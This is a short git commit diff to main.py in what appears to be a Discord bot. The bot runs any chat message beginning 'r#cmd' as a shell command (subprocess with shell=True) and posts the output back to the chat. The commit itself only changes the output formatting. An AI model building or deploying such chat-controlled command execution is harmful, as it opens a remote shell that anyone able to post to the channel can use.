5cae2054a3a29d18b0ad11454da43a87c6676257
U-Nano39 <73567618+U-Nano39@users.noreply.github.com>
2023-10-07 14:21:29 +0900

    main.py を更新

--- main.py
+++ main.py
@@ -53,7 +53,7 @@ class Discord:
             if self.message_content().startswith("r#cmd"):
                 cmd = self.message_content().strip("r#cmd ").split()
                 proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                self.send_message(f"``[cmd] {cmd}``\n```{proc.communicate()[0].decode('UTF-8')}```")
+                self.send_message(f"``[cmd] {cmd}``\n```{proc.communicate()}```")
             time.sleep(0.5) 
 
 if __name__ == "__main__":
